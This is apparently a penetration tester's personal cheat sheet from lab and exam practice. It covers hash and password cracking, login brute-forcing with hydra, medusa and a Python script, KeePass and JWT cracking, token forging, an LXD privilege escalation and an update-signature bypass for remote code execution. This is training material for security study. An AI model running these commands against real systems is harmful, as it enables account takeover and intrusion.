```

### John - Post cracking - show the password from the candiate hash file
```
john --show william.hash              ## john - after its cracked you might not always see the the password on the screen but you can run this and it will be called from the `.john/john.pot` file
```


### pdftojohn

```
perl /usr/share/john/pdf2john.pl Infrastructure.pdf | tee pdf_hash        # pdf2john -  This is the fastest and native wauy to get a pdf hash
```

```
git clone https://github.com/benjamin-awd/pdf2john.git        # pdf2john - get pdf hashes with john - Could be in "Tools" but might need a new clone 
Runs ins pyvenv : pip install -r requirements.txt             # pdf2john - get pdf hashes with john -
./src/pdf2john/pdf2john.py example.pdf >> .hash               # pdf2john - get pdf hashes with john -
```

###  cracking zip file passwords with zip2john or fcrackzip

```
zip2john LOCKEDFILE.zip > UNLOCKED.hash
john --wordlist=/usr/share/wordlists/rockyou.txt UNLOCKED.hash
```

Once John has cracked the zip hash you need to ask john to show you the password for each file (**Its not too intuative**)

The command would be something like 

```c
john UNLOCKED.hash --show                                     
```
Where the password is **codeblue**

```
...
sitebackup3.zip/joomla/.DS_Store:codeblue:joomla/.DS_Store:sitebackup3.zip:sitebackup3.zip
sitebackup3.zip/joomla/LICENSE.txt:codeblue:joomla/LICENSE.txt:sitebackup3.zip:sitebackup3.zip
sitebackup3.zip/joomla/README.txt:codeblue:joomla/README.txt:sitebackup3.zip:sitebackup3.zip
sitebackup3.zip/joomla/cache/index.html:codeblue:joomla/cache/index.html:sitebackup3.zip:sitebackup3.zip
...
```


#### fcrackzip

```
fcrackzip -uDp /usr/share/wordlists/rockyou.txt backup.zip    # Alt to zip2john
```

### cewl

- Generate custom worklist from an online page  
- allows specifications of passwords
- spider depth
```
cewl www.foo.com -m 6 -w target-PW-List.txt
```

## Crunch - make a custom wordlists 
**Note: Crunch can make massive lists which could fill up your memory. Take care**
`crunch 6 6 -t Lab%%% > wordlist`
- minimum and maximum length to 6 characters,
- **-t** parameter, and set the first three characters to **Lab** followed by three numeric digits.
	- `@` lowerchase char
	- `,`uppercase char
	- `%` number
	- `^` symbol


#### Bruteforce Python script from Offsec Interface

```py
#!/usr/bin/env python

from concurrent.futures import ThreadPoolExecutor as executor
import requests,sys


headers = {"Content-Type": "application/json", "Host": "interface.pg"}


def printer(url):
	sys.stdout.write(url+"                                                                       \r")
	sys.stdout.flush()
	return True

#@snoop
def Login(USERNAME, PASSWORD):
	printer("Trying: "+USERNAME+":"+PASSWORD)
	data = {"username":"USERNAME", "password":"PASSWORD"}
	data['username'] = USERNAME
	data['password'] = PASSWORD
	req = requests.post("http://interface.pg/login", json=data, headers=headers)
	if req.status_code != 401:
		print(str(req.status_code)+" | Creds> "+USERNAME+":"+PASSWORD)
		print('\n')
		exit(0)


users = open('users.txt', 'r')
for user in users:
	USERNAME = user.strip('\n')
	passwds = open('/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt', 'r')
	with executor(max_workers=20) as exe:
		[exe.submit(Login, USERNAME, passwd.strip('\n')) for passwd in passwds]
```


### Medusa
Multi headed login bruteforce
#### Get help
```
medusa -M http -q    # get help on the http module
medusa -M ssh -q     # get help on the ssh module
```
#### Example commands
```
medusa -h <VICTIM-IP> -u <USER> -P rockyou.txt -M http -m DIR:/path/of/login
medusa -h <VICTIM-IP> -u <USER> -P words.txt -M ssh
```



## Hydra

hydra Supported services: `adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp`

Brute force a login for user `george` 
- `hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.179.201`
Password spray on a list of users via ssh ( See htb Funnel) 
`hydra -L usernames.txt -p 'funnel123#!#' {<IP_ADDRESS>} ssh`
Try on **rdp**
- ``hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.179.202`
Basic Auth 
- `hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.179.201 http-get -I`
Post Request on Basic auth
```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt git.offseclab.io http-post-form "/user/login:_csrf=eGvyLJ7qkGgIZRLJVA_tnDhwA9g6MTczMzU2ODcwNzk3NjQyNzA3NQ&user_name=^USER^&password=^PASS^:F=Username or password is incorrect."    - Brute force on basic auth - Post Request on Basic auth
```

```
hydra -l root -P /usr/share/seclists/Passwords/Common-Credentials/darkweb2017_top-1000.txt 192.168.161.88 mysql -v
```

Hydra ssh bruteforce ( OFPG DC-9)
```
hydra -L usernames.txt -P passwords.txt 192.168.120.66 ssh
```

```sh
#!/bin/bash                                                 # Basic auth base64 prep script for encodeing credentials - possibly with Hydra or burp
while read user; do                                         # Basic auth base64 prep script for encodeing credentials - possibly with Hydra or burp                                    
  while read pass; do                                       # Basic auth base64 prep script for encodeing credentials - possibly with Hydra or burp
    echo -n "$user:$pass" | base64                          # Basic auth base64 prep script for encodeing credentials - possibly with Hydra or burp               
  done < ../passwords.txt                                   # Basic auth base64 prep script for encodeing credentials - possibly with Hydra or burp    
done < ../users.txt > base64_encoded_credentials.txt        # Basic auth base64 prep script for encodeing credentials - possibly with Hydra or burp                                
```

#### HTTP POST Login Form
Get help on the http modules with: `hydra -U https-post` 
1. Capture the request in burpnn
2. Set up hydra for a `http` or `https` request with the **http[s]-post-form** argulat whith accepts three colon-delimited fields:
The first field indicates the location of the login form. In this demonstration, the login form is located on the **index.php** web page. The second field specifies the request body used for providing a username and password to the login form, which we retrieved with Burp. Finally we must provide the failed login identifier, also known as a _condition string_.
- `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.179.201 http-post-form "LOCATION-OF-LOGIN:REQUEST-BODY-PARAM-FOR-LOGIN-:CONDITION-STRING"`
- `hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.179.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"`

**Understand that** the condition string is searched for within the response of the web application to determine if a login is successful or not. To reduce false positives, we should always try to avoid keywords such as password or username. To do so, we can shorten the condition string appropriately.

OSPG Interface Bruteforce _ note: `:1=:` did not work to suppress errors??
```
hydra -l user -P /usr/share/wordlists/seclists/Usernames/xato-net-10-million-passwords-10.txt 192.168.128.106 http-form-post "/login:username=^USER^&password=^PASS^:F=Unauthorized"
```


``
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 192.168.179.46 -s 242 http-get /      #hydra http get example
hydra -l gaara -P /usr/share/wordlists/rockyou.txt -t 30 ssh://192.168.179.142
hydra -l gaara -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 30 ssh://192.168.179.142              # smaller wordlist 1009 words

Fro mthe Cherry notes of - https://www.youtube.com/watch?v=gXFTM3fRqIg&list=WL&index=2
```
hydra -l '' -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt [IP] https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect"
```
-"LOGINPAGE:PARAMETERS:FAILMESSAGE"
-try using cewl for wordlist if rockyou isnt doing it for you



## Hash Cracking Methodology
We can describe the process of cracking a hash with the following steps:
1. **Extract hashes** - dump the database table
2. **Format/Identify hashes** - `hashid` or `hash-identifier`
3. **Calculate the cracking time** - Is it worth it? 
4. **Prepare wordlist** 
5. **Attack the hash** - Take special care when Copying /pasting

1 (Kali Tools, 2022), https://www.kali.org/tools/hash-identifier/ ↩︎
2 (Kali Tools, 2022), https://www.kali.org/tools/hashid/ ↩︎


## hashid
Install with `pip3 install hashid`
then run a command like `hashid e7816e9a10590b1e33b87ec2fa65e6cd` or 
`hashid hashInAFile.txt`

Output suggestions like:
```sh
┌──(root㉿kali)-[~]
└─# hashid e7816e9a10590b1e33b87ec2fa65e6cd
Analyzing 'e7816e9a10590b1e33b87ec2fa65e6cd'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
```
## mdxfind - (Better hash identifier, CPU based)

Releases - https://www.techsolvency.com/pub/bin/mdxfind/#download . ( best for me was the plain binary, not ".static")
MDXFIND hash identifer Bible - https://0xln.pw/MDXfindbible 
```
echo "844ffc2c7150b93c4133a6ff2e1a2dba" | mdxfind -h 'MD5PASSSALT' -s salt.txt /usr/share/wordlists/rockyou.txt -i 5

1 salts read from salt.txt
Iterations set to 5
Working on hash types: MD5PASSSALT SHA1revMD5PASSSALT SHA1MD5PASSSALT MD5-SALTMD5PASSSALT                                                                                                                                                                                                                                                                            
1 total salts in use
Reading hash list from stdin...
Took 0.00 seconds to read hashes
Searching through 1 unique hex hashes from <STDIN>
Maximum hash chain depth is 1
Minimum hash length is 32 characters
Using 4 cores
MD5PASSSALTx02 844ffc2c7150b93c4133a6ff2e1a2dba:YOUR_SALT_HERE:Mike14

Done - 4 threads caught
14,344,392 lines processed in 10 seconds
1434439.20 lines per second
9.97 seconds hashing, 315,576,624 total hash calculations
31.66M hashes per second (approx)
1 total files
1 MD5PASSSALTx02 hashes found
1 Total hashes found

```



## John the Ripper
```
zip2john LOCKEDFILE.zip > UNLOCKED.hash
john --wordlist=/usr/share/wordlists/rockyou.txt UNLOCKED.hash
```

The content of the processed file might contain something like the following where we shall see the password is "codeblue"

```
...
...
sitebackup3.zip/joomla/README.txt:codeblue:joomla/README.txt:sitebackup3.zip:sitebackup3.zip                                                                                                                                                
sitebackup3.zip/joomla/cache/index.html:codeblue:joomla/cache/index.html:sitebackup3.zip:sitebackup3.zip
sitebackup3.zip/joomla/cli/index.html:codeblue:joomla/cli/index.html:sitebackup3.zip:sitebackup3.zip
sitebackup3.zip/joomla/cli/joomla.php:codeblue:joomla/cli/joomla.php:sitebackup3.zip:sitebackup3.zip
sitebackup3.zip/joomla/configuration.php:codeblue:joomla/configuration.php:sitebackup3.zip:sitebackup3.zip
...
...
```





Once we have **obtained a key FIRST WE MODIFY THE PERMISSIONS** - cracking ssh keys wth John
```
chmod 600 id_rsa                                             # cracking ssh keys wth john
ssh2john id_rsa > ssh.hash`                                  # cracking ssh keys wth john
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash    # cracking ssh keys wth john 
```
## HashCat - basics
!!! Be Carefull when transporting hashes around eg COPYING/PASTING etc. They might become unworkabkle.
!!! Sometimes hashcat is fussy about the format and might reject the hash. Although powerful , `john` might be a better choice: `john --wordlist=rockyou.txt msql.hash`

```
# put hash in quotes to preserver the special chars
hashcat -m 3200 -a 0 '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm' /usr/share/wordlists/rockyou.txt --show -O HASHCAT-OUTPUT.txt

echo '<SOMEHASHVALUE_EG_MD5' > hash.txt
hashcat -a 0 -m 0 hash.txt /usr/share/wordlists/rockyou.txt --show -O HASHCAT-OUTPUT.txt
```
- `-o <OUTPUT-FILE>.txt` is the output file which could come in handy lateron
```sh
hashcat -a 0 -m 0 hashInAFile.txt /usr/share/seclists/Passwords/Leaked-Databases/md5decryptor-uk.txt -r /usr/share/hashcat/rules/best64.rule --show -O HASHCAT-OUTPUT.txt
```

```
hashcat -a 0 -m 1700 hash /usr/share/wordlists/rockyou.txt        # Cracking SHA2-512 with -m 1700 - Offsec Phobos
```

```
hashcat -m 5600 enox.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force         # Cracking NTLMv2
```

```
hashcat --hash-info                             # Prints hash info includeing has hexamples to idendify hashes 
```

Hashcat stores all cracked passwords in its potfile here
```
/home/kali/.local/share/hashcat/hashcat.potfile
```

John stores them all in here
```
/home/kali/.john/john.pot
``



#### HashCat Rules
- `hashcat -m 0 HASH-FILE.txt <WORDLIST> -r <RULEFILE> --force --show -o HASHCAT-OUTPUT.txt`
- `hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r demo3.rule --force --show -o HASHCAT-OUTPUT.txt`
Hashcat includes a variety of effective rules in `/usr/share/hashcat/rules:`

Search for KeePass hashing mode in the docs :
- `hashcat --help | grep -i "KeePass"`
Try Cracking a keepass hash with the rule rockyou3000 set 
- `hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force --show -o HASHCAT-OUTPUT.txt`
The 64 best effective rules.
- `hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show -o HASHCAT-OUTPUT.txt`

```
hashcat -m 18200 hash-svc.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule      # Ippsecs PRefereed starting Rule ( HTB Forest)
```

## Pasword list creation

The ippsec way ( HTB FOREST - not a BF box )
```
for i in $(cat password.txt); do echo $i; echo ${i}\!; echo ${i}2024; echo ${i}2020; echo ${i}; done                      # Password list creation 
```
```
hashcat --force --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule " | sort -u | awk 'length($0) > 8'     # Password list creation 
```
Or Create a small relavent passsoerd list and then mutated/expanded the list with hashcat          # Password list creation 
- `hashcat --force somepasswords.txt -r /usr/share/hashcat/rules/best64.rule --stdout > NewPW.txt`   or use `--show -o HASHCAT-OUTPUT.txt`          # Password list creation 
count with ` ... | wc -l`                      # Password list creation 

#### Attack modes 
```sh
- [ Attack Modes ] -
  # | Mode
 ===+======
  0 | Straight
  1 | Combination
  3 | Brute-force
  6 | Hybrid Wordlist + Mask
  7 | Hybrid Mask + Wordlist
  9 | Association
```

#### Cracking modes
[We can search here for different hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) ( ( example colum) and there respecive modes for the tool ( first colum) eg below mode `13100` == `Kerberos 5`
```
hashcat -m 13100 thehash /usr/share/wordlists/rockyou.txt --show -o HASHCAT-OUTPUT.txt
```

<details>
	<summary>example output</summary>

```sh
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i9-10900 CPU @ 2.80GHz, 18692/37448 MB (8192 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$f25b8a3e219ba5f26b7277bb4227801a$a92862c77f7092ee09821647480c71d5808dbb547bf12a8338bb6151397803065254368d1e39b161cc60751ba31fe2e226f118376dde3524571f0ef85a85d02b0119e89bc434a88e14999e52ef6c7dada16a5a5cab78d5c09cf261a10bc5776d87da1080e9e283c48dfea44db4c4f20dfb11e9718dd8d0ca5114bca86bbca128f9e8aaf644ea6f3a3561000e031886aa77ff83df73a688f216c8ac854ad0ca025c8a262d0a0087e8a689898ba2bae498ba2c25a16698ac7e18eecf615a7e3e6d152566b5299583ae8dece03a5850d7d0afb48ecbf19aa49778de94cedcce04d512e5ff4fb79ec61e8f18e08e7abc2ae900167e090e7569895120df8f225b52dc9b4153d4361691ff0dacb8356d7d68d273181421c3af3cb2feae8b42778d1fe17e83f04e62beb7db16c407b846d8d45ab53939ce18d83ec7cbc54c433e3983495adb719781002e11d1c67e4a0814b4397b4e588ac3d04b399792331d599bec60b702810fbbe0f2b84b8ac5c1255206faa506133e03750fd94b097c1693668877d781190db08a97f1acb6f42947a6e1f49321cea8c23199dc7c4f8d77ce1b197623e8cdd5a289f4efd6746a9049a1d794c3da2827cb2abac13d89d725fb80ac8b6a7a270c3391cad606725240f8a149f26092c77b947833d6973f47ad5d3b7958a998acbfd3bbaca000fdf7dcfe62fa9a45ec0229e98e96aa3365fe3c17dd27cc7bde9f8deebf8cf546d0ebeaec73e5cdd27c078fb72042a4084dc7f17e56e1e6bef0f08ff5cf4709e04fd3fc088204dcdc9017b6e0c25e14c997f4d3fec0de9b3a141930ff54092cff71a0f94caba2ed365f01ad88987adea197f2fa3917d2e2da797c2d9e272518801c4c7dfc1a8683e872ed4df5c126d04702dbc77a942f9e7cc7807320b1dcd444ce47a1444a874e110c302f6511726a26ed361caabe8a0b347f61714b9c4bd895eebd52ddbe2e8598853778f864b7e06810a74017df08047592ed0ac60a7cfe3481d979499491f56fd11401b561fd691cc9c9a6b5bcc90728ee193c785d8642d9c6d62554abbda609c0c9b7776a341dbcfa7e9c781c454dacab5324c513799db8aaf5433a6b7f0b52ab6c5f30251cd4ad9b7d676b87d5da919d328e6bc26f89d9782e32cacad66b1b1ede8927f32a12ea21d857855f1d0df5780f857c97bba3439c73542f9c5f98ed7b17ebd94bb272fb9af8f118d998067556912dd0b9ae819626fc0723d978ded2e7628eca7f941e40f3:Ticketmaster1968
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...1e40f3
Time.Started.....: Fri Jan 12 15:55:30 2024 (7 secs)
Time.Estimated...: Fri Jan 12 15:55:37 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1514.4 kH/s (1.87ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344385 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10534912/14344385 (73.44%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tioncurtis23 -> Thelittlemermaid
Hardware.Mon.#1..: Util: 56%

Started: Fri Jan 12 15:55:15 2024
Stopped: Fri Jan 12 15:55:39 2024
```

</details>

## Password Manager Vault File Types
- **KeePass** - `.kdbx`
- **LastPass** - `.lpvault`
- **1Password** - `.opvault`
- **Dashlane** - `.dash`
- **Bitwarden** - `.json` (export format)
- **Password Safe** - `.psafe3`
- **RoboForm** - `.rfo`
- **Enpass** - `.walletx`
- **NordPass** - `.npvault`

Note: keepass cli too called "kpcli"

### Cracking ssh/etc/shadow hashes

Prefixes you might see 
```
$1$                                 # Linux - Cracking ssh /etc/shadow hashes - MD5    
$2a$ or $2y$                        # Linux - Cracking ssh /etc/shadow hashes - bcrypt
$5$                                 # Linux - Cracking ssh /etc/shadow hashes - SHA-256
$6$                                 # Linux - Cracking ssh /etc/shadow hashes - SHA-512

cat /etc/login.defs                 # Linux - Cracking ssh /etc/shadow hashes - Look for a line like "ENCRYPT_METHOD SHA512" which define s the algorithm
cat /etc/pam.d/common-password      # Linux - Cracking ssh /etc/shadow hashes - hashing may also be declare here in a line that starts with "Password" and ends with the algo eg SHA512
```

### Cracking a JWT with hashcat
1. Put the JWT in a file
```
echo -n "eyJh...JWT_BLOB...8TZo" > jwt_to_crack.txt       # Cracking a JWT with hashcat
```

2. Crack with mode `16500` and this 
```
hashcat -a 0 -m 16500 jwt_to_crack.txt hashcat -a 0 -m 16500 jwt_to_crack.txt /usr/share/seclists/Passwords/scraped-JWT-secrets.txt           # Cracking a JWT with hashcat
```

If you need the list form the web Get the Fuzz List here like this 
```
curl -o scraped-jwt-secrets-FuzzList.txt https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/scraped-JWT-secrets.txt > /dev/null 2>&1
```

### Verify the Cracked password against the Jwt  ( Offsec OSCP Aws labs)
Either on :
- https://jwt.is/
- [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWT_Verify('this-secret-strength-is-over-nine-thousand')&input=ZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnBaQ0k2Tnl3aVptbHljM1JmYm1GdFpTSTZJa3hsWVhKdVpYSWlMQ0pzWVhOMFgyNWhiV1VpT2lKTVpXRnlibVZ5SWl3aVpXMWhhV3dpT2lKc1pXRnlibVZ5UUhSbGMzUXVhVzUwWlhKdVlXd2lMQ0pwYzE5d2NtVnRhWFZ0SWpwdWRXeHNMQ0psZUhBaU9qRTNORFkxTmpVMk16WjkueWhhTWNzQjRLaXc3Vy1wd0lzS3puU2dnYS1VOVBpOURYTVIzaVM0U1JGcw)
- or with this `jwt-verifyer.py` below

```
import jwt
import sys

if len(sys.argv) != 3:
    print("Usage: python verify_jwt.py <token> <secret>")
    sys.exit(1)

token = sys.argv[1]
secret = sys.argv[2]

try:
    result = jwt.decode(token, secret, algorithms=['HS256'])
    print("Valid signature! Decoded payload:", result)
except jwt.exceptions.InvalidSignatureError:
    print("Invalid signature!")
except Exception as e:
    print(f"Error: {e}")
```


### Generate a new JWT with our password - Setting `is_premium` to True

Remember if applicable to:
- Set the email correctly to your user
- Set the password

```
python -c "import jwt, datetime; print(jwt.encode({'id':7,'first_name':'Learner','last_name':'Learner','email':'test@test.com','is_premium':True,'exp':int(datetime.datetime.now().timestamp() + 24*60*60)}, 'this-secret-strength-is-over-nine-thousand', algorithm='HS256'))"
```

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NywiZmlyc3RfbmFtZSI6IkxlYXJuZXIiLCJsYXN0X25hbWUiOiJMZWFybmVyIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwiaXNfcHJlbWl1bSI6dHJ1ZSwiZXhwIjoxNzY5ODU5NDgyfQ.s5J-_GQ8KD5reFZGhE8eFZnBq_4LCw_9r13vRWr5LMg
```

Need to also update out Auth_user
```
{"id":7,"first_name":"Learner","last_name":"Learner","email":"tes@test.com","is_premium":true,"user_id":7,"address_id":7,"street":"EverGreen ;","city":"SpringField","state":"asdf a","zipcode":"09595","country":"USA"}
```


When we write a revewi we can do some SSRF to get the env of the system buy submitting as the iamge URL `file://proc/self/environ`





## Databases
sqlite browser tool: https://sqlitebrowser.org/ can load database files and see the contens in a gui

```
sqlite3 <DATABASE_FILE>.db .dump       # sql will dump all the data in the cli
```

#### Keepass tools 


```
K:> keepassxc       # GUI tool for Keepass 
```

```
K:> /home/kali/Tools/keepass4brute/keepass4brute.sh DATAFILE.kdbx /usr/share/wordlists/rockyou.txt     # Keepass bruteforce tool - https://github.com/r3nt0n/keepass4brute
```



## Keepass vault database file interogation with kpcli tool

```
K:> kpcli Database.kdbx                                         # Keepass vault database file interogation with kpcli tool for .kdbx files - might have found a file called Database.kdbx . OPen it or run the kpcli in the dame dir as it  
kpcli:/> help                                                   # Keepass vault database file interogation with kpcli tool for .kdbx files - get help
kpcli:/> open Database.kdbx                                     # Keepass vault database file interogation with kpcli tool for .kdbx files - open the vault and give the cracked password when asked (see keepass2john  - (remeber to delete the leading salt. When you convert the KeePass database to the hashcat format using keepass2john, then keepass2john adds the file name and a colon at the beginning of the hash.)
This must be removed by hand, because hashcat does not recognize the hash

Provide the master password: *************************

kpcli:/> stats                                                  # Keepass vault database file interogation with kpcli tool for .kdbx files - see stats eg how any entries are in the PW db file
kpcli:/Database/Network> cd ../Recycle\ Bin/                    # Keepass vault database file interogation with kpcli tool for .kdbx files - Change dir like normal
kpcli:/Database/General> ls                                     # Keepass vault database file interogation with kpcli tool for .kdbx files - list the items with ls ( or dir)
=== Entries ===                                                 # Keepass vault database file interogation with kpcli tool for .kdbx files - See the entry items 
0. LOGIN local admin                                            # Keepass vault database file interogation with kpcli tool for .kdbx files - See the entry items                                  
1. User Password                                                # Keepass vault database file interogation with kpcli tool for .kdbx files - See the entry items                                  
kpcli:/Database/General> show -f 0                              # Keepass vault database file interogation with kpcli tool for .kdbx files - show the items with -f option to force the display of all fields  

```


### LXD Privesc (HTB Identified)
```
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
lxc init myimageNasty ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
id
```

### TFTP
Trivial File Transfer Protocol (TFTP) is a simple protocol that provides basic file transfer function with no user authentication. 
TFTP is intended for applications that do not need the sophisticated interactions that File Transfer Protocol (FTP) provides.  
It is also revealed that TFTP uses the User Datagram Protocol (UDP) to communicate. 
This is defined as a lightweight data transport protocol that works on top of IP.
### UDP
UDP provides a mechanism to detect corrupt data in packets, but it does not attempt to solve other problems that arise with packets, such as lost or out of order packets.
It is implemented in the transport layer of the OSI Model, known as a fast but not reliable protocol, unlike TCP, which is reliable, but slower then UDP.
Just like how TCP contains open ports for protocols such as HTTP, FTP, SSH and etcetera, the same way UDP has ports for protocols that work for UDP.

### Nikto
`nikto -C all -h 10.129.95.185 -o NiktoReport.txt`




### Webserver configuration file  locations 

```
### 🌐 Web Server Configuration File Paths by Stack
# ——— Apache (LAMP / Linux) ———
/etc/apache2/apache2.conf                                                       # Webserver conf - LAMP Stack - Main Apache config on Debian/Ubuntu  
/etc/httpd/conf/httpd.conf                                                      # Webserver conf - LAMP Stack - Main Apache config on RHEL/CentOS  
/etc/apache2/sites-available/000-default.conf                                   # Webserver conf - LAMP Stack - Default vhost config (available)  
/etc/apache2/sites-enabled/000-default.conf                                     # Webserver conf - LAMP Stack - Active vhost config (enabled)  
/var/www/html/                                                                  # Webserver conf - LAMP Stack - Default web root  

# ——— Apache (XAMPP / macOS/Linux) ———
/opt/lampp/etc/httpd.conf                                                       # Webserver conf - XAMPP Stack - Main Apache config (XAMPP Linux)  
/Applications/XAMPP/xamppfiles/etc/httpd.conf                                   # Webserver conf - XAMPP Stack - Main Apache config (XAMPP macOS)  
/opt/lampp/etc/extra/httpd-vhosts.conf                                          # Webserver conf - XAMPP Stack - Virtual hosts (XAMPP Linux)  
/Applications/XAMPP/xamppfiles/htdocs/                                          # Webserver conf - XAMPP Stack - Default web root (macOS XAMPP)  

# ——— Apache (WAMP / Windows) ———
C:\wamp\bin\apache\apache2.x.x\conf\httpd.conf                                  # Webserver conf - WAMP Stack - Main Apache config (WAMP)  
C:\wamp\bin\apache\apache2.x.x\conf\extra\httpd-vhosts.conf                     # Webserver conf - WAMP Stack - Virtual hosts  
C:\wamp\www\                                                                    # Webserver conf - WAMP Stack - Default web root (WAMP)  

# ——— Nginx (LEMP / Linux) ———
/etc/nginx/nginx.conf                                                           # Webserver conf - LEMP Stack - Main Nginx config  
/etc/nginx/sites-available/default                                              # Webserver conf - LEMP Stack - Default server block config  
/etc/nginx/sites-enabled/default                                                # Webserver conf - LEMP Stack - Active server block  
/usr/share/nginx/html/                                                          # Webserver conf - LEMP Stack - Default web root  

# ——— IIS (Windows) ———
C:\Windows\System32\inetsrv\config\applicationHost.config                       # Webserver conf - IIS Stack - Master config (XML format)  
C:\inetpub\wwwroot\                                                             # Webserver conf - IIS Stack - Default IIS web root  
C:\inetpub\logs\LogFiles\                                                       # Webserver conf - IIS Stack - IIS logs  
```


# Misc
Create a webserver with node
`npx http-server -p 9999`
Disable the CSS/css by pasting the following into the dev tools console
`var el = document.querySelectorAll('style,link'); for (var i=0; i<el.length; i++) {el[i].parentNode.removeChild(el[i]);};`

`brew install mitmproxy`
`pip3 install mitmproxy2swagger # Plugin to scrape an api of all its endpoints`

#### Alias file for root
`/etc/profile.d/aliases.sh`
                                              

kali screen shots alias
- `alias shot='xfce4-screenshooter -r -s /home/kali/Desktop'`


---


#### Yaml Signaturebypass to get RCE
- THis https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html

Get the hash of the malicious file as below command:
```
sha512sum s4.exe | awk '{print $1}' | xxd -r -p | base64 -w 0                          # Yaml Signaturebypass to get RCE
```

Below is the yaml file content. POints to note:    
```yml
version: 1.2.3                                                                         # Yaml Signaturebypass to get RCE - choose a version which is higher than the current so the update applys
files:                                                                                 # Yaml Signaturebypass to get RCE  - OVERALL , yaml iundentation is very picky and may need massageing !!
  - url: v’ulnerable-app-setup-1.2.3.exe                                               # Yaml Signaturebypass to get RCE - the single quotes are part of the breaking mechanism, Nmae your file accordingly
  sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZ[...]tkYPEvMxDWgNkb8tPCNZLTbKWcDEOJzfA==         # Yaml Signaturebypass to get RCE - swap out the examplke chekcsums for generatedone
  size: 7842                                                                       # Yaml Signaturebypass to get RCE - make the size the smae as rthe malicious - (Mihght not matter ) 
path: v'ulnerable-app-1.2.3.exe                                                        # Yaml Signaturebypass to get RCE 
